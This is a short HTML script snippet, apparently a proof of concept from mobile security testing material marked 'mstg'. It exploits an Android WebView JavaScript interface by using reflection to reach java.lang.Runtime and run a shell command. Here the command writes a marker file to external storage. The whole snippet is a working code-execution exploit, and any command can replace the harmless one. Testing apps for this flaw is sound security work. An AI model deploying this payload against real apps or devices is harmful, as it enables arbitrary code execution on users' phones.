<script>
function execute(cmd){
  return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mstg\" > /storage/emulated/0/mstg.txt']);
</script>